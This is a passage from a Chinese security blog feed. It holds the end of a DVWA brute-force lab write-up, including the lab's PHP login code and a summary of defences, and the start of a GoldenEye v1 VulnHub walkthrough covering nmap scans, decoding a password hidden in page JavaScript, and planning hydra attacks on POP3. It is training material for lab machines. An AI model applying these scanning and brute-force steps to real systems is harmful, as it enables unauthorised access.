function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\">// 如果是有效的登录...</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\">// 获得用户信息</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token variable\">$avatar</span>       <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'avatar'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token variable\">$last_login</span>   <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\">// 登录成功</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token comment\">// 自上次登录以来，帐户是否被锁定？</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Number of login attempts: &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$failed_login</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>.&lt;br />Last login attempt was at: &lt;em>$&#123;last_login&#125;&lt;/em>.&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token comment\">// 重置错误的登录计数</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token comment\">// 登录失败</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token comment\">// 用户反馈</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$lockout_time</span><span class=\"token punctuation\">&#125;</span></span> minutes&lt;/em>.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token comment\">// 更新错误登录计数</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token comment\">// 设置上次登录时间</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\">// 生成 session token</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h3>\n<p>对于暴力破解，可以通过设置 token、设定登录失败次数的阈值、设置验证码等来进行防御。</p>\n<p>对于攻击者来说，社工才是更好的选择。</p>\n<p>这个靶场主要练习了 BurpSuite 的抓包，Intruder 模块，熟练使用不同的攻击类型，以及根据情况配置不同的 payload，PHP 代码审计也至关重要，仍需继续努力...</p>\n<ul>\n<li>\n<p>Burp Suite</p>\n<ul>\n<li>proxy 模块</li>\n<li>intruder 模块\n<ul>\n<li>4 种攻击类型</li>\n<li>抓取重要响应内容配置 payload</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>暴力破解防范措施</p>\n</li>\n<li>\n<p>php 代码审计</p>\n</li>\n</ul>\n",
            "tags": [
                "Web安全",
                "靶场渗透",
                "打靶",
                "Web安全",
                "DVWA"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/05/15/GoldenEye-v1-%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/",
            "url": "https://ph0ven1x.github.io/2024/05/15/GoldenEye-v1-%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/",
            "title": "GoldenEye v1 靶场渗透",
            "date_published": "2024-05-15T02:25:11.000Z",
            "content_html": "<h1 id=\"1-goldeneye-v1-靶场渗透\"><a class=\"anchor\" href=\"#1-goldeneye-v1-靶场渗透\">#</a> 1-GoldenEye v1 靶场渗透</h1>\n<p>靶场地址：<a href=\"https://www.vulnhub.com/entry/goldeneye-1,240/\">https://www.vulnhub.com/entry/goldeneye-1,240/</a></p>\n<p>目标：获取 root 权限并捕获秘密的 GoldenEye 代码 - flag.txt。</p>\n<h2 id=\"1信息收集-密码爆破\"><a class=\"anchor\" href=\"#1信息收集-密码爆破\">#</a> 1. 信息收集、密码爆破</h2>\n<p>使用 <code>nmap</code>  扫描 C 段主机存活情况。</p>\n<p>本机 IP：192.168.222.133  靶机 IP：192.168.222.130</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">192.168</span>.222.0/24</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:44 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> DESKTOP-AACP4RA.mshome.net <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.222.1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00017s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:01 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000095s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.254</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000092s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:50:56:E8:F5:23 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.133</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">3.99</span> seconds</pre></td></tr></table></figure><p>简单扫描一下靶机 IP，发现 <code>25</code>  和 <code>80</code>  端口开放</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:45 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000091s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">998</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT   STATE SERVICE</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">25</span>/tcp <span class=\"token function\">open</span>  smtp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">1.26</span> seconds</pre></td></tr></table></figure><p>有 <code>80</code>  端口，打开网站 <code>192.168.222.130</code>  看看。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513214729508.png\" alt=\"image-20240513214729508\" /></p>\n<p>说发现一个目录可以登录： <code>192.168.222.130/sev-home/</code></p>\n<p>进入后弹出登录的对话框，但是没有账号和密码</p>\n<p>右键看一下 192.168.222.130 的源码，发现 terminal.js 文件</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513214950343.png\" alt=\"image-20240513214950343\" /></p>\n<p>查看 terminal.js 文件，得到一些信息</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//Boris, make sure you update your default password. </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//My sources say MI6 maybe planning to infiltrate. </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//Be on the lookout for any suspicious network traffic....</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//I encoded you p@ssword below...</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//BTW Natalya says she can break your codes</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>翻译：</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//Boris，请确保更新您的默认密码。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 我的消息来源说军情六处可能计划渗透。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 留意任何可疑的网络流量......</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 我在下面给你编码了密码</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// 顺便说一句，Natalya 说她可以破解你的密码</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr></table></figure><p>关键信息：</p>\n<p><code>Boris</code> 、 <code>Natalya</code> 、 <code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code></p>\n<p><code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code></p>\n<p>HTML 加密，解密得到密码：InvincibleHack3r</p>\n<p>根据上文，这应该时 Boris 的密码，Boris,InvincibleHack3r 尝试登录，登录失败</p>\n<p>尝试用户名小写 boris, 再次登录，登录成功～</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513215436982.png\" alt=\"image-20240513215436982\" /></p>\n<p>页面显示信息：</p>\n<pre><code>GoldenEye\n\nGoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)\n\nPlease email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system\n\nRemember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port\n\n黄金眼\n\n“黄金眼”是苏联的绝密轨道武器项目。既然您拥有访问权限，那么您肯定拥有绝密许可，并且有资格成为经过认证的黄金眼网络操作员 (GNO)\n\n请向合格的 GNO 主管发送电子邮件以接收在线黄金眼操作员培训，成为黄金眼系统的管理员\n\n请记住，由于隐匿性安全非常有效，因此我们已将 pop3 服务配置为在非常高的非默认端口上运行\n\n\n</code></pre>\n<p>关键信息： <strong>pop3 服务配置为在非常高的非默认端口上运行</strong></p>\n<p>我们之前没有扫到 pop3 的端口，现在使用 nmap 进行全端口扫描。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -p- <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:56 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00079s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">65531</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT      STATE SERVICE</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">25</span>/tcp    <span class=\"token function\">open</span>  smtp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">80</span>/tcp    <span class=\"token function\">open</span>  http</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">55006</span>/tcp <span class=\"token function\">open</span>  unknown</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">55007</span>/tcp <span class=\"token function\">open</span>  unknown</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">1.88</span> seconds</pre></td></tr></table></figure><p>发现未知的 55006 和 55007 端口，进一步针对这两个端口进行扫描</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -p55006,55007 <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-sS</span> <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-T5</span> <span class=\"token parameter variable\">-A</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 <span class=\"token number\">10</span>:02 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00028s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT      STATE SERVICE  VERSION</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">55006</span>/tcp <span class=\"token function\">open</span>  ssl/pop3 Dovecot pop3d</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>localhost/organizationName<span class=\"token operator\">=</span>Dovecot mail server</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2018</span>-04-24T03:23:52</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2028</span>-04-23T03:23:52</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">|</span>_pop3-capabilities: SASL<span class=\"token punctuation\">(</span>PLAIN<span class=\"token punctuation\">)</span> PIPELINING TOP CAPA <span class=\"token environment constant\">USER</span> RESP-CODES AUTH-RESP-CODE UIDL</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">55007</span>/tcp <span class=\"token function\">open</span>  pop3     Dovecot pop3d</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>localhost/organizationName<span class=\"token operator\">=</span>Dovecot mail server</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2018</span>-04-24T03:23:52</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2028</span>-04-23T03:23:52</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span>_pop3-capabilities: PIPELINING AUTH-RESP-CODE STLS RESP-CODES SASL<span class=\"token punctuation\">(</span>PLAIN<span class=\"token punctuation\">)</span> TOP CAPA <span class=\"token environment constant\">USER</span> UIDL</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Warning: OSScan results may be unreliable because we could not <span class=\"token function\">find</span> at least <span class=\"token number\">1</span> <span class=\"token function\">open</span> and <span class=\"token number\">1</span> closed port</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Device type: general purpose</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Running: Linux <span class=\"token number\">3</span>.X<span class=\"token operator\">|</span><span class=\"token number\">4</span>.X</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>OS details: Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">4.9</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">0.28</span> ms <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">27.22</span> seconds</pre></td></tr></table></figure><p>关键信息：</p>\n<p><strong>55006：ssl/pop3：mail server</strong></p>\n<p><strong>55007：pop3：mail server</strong></p>\n<p>发现 55006 和 55007 都是 pop3，用作邮件服务的。</p>\n<p>考虑用 hydra 爆破 pop3</p>\n<p>目前收集了两个用户名：boris、natalya，先将他们写进 users.txt</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td 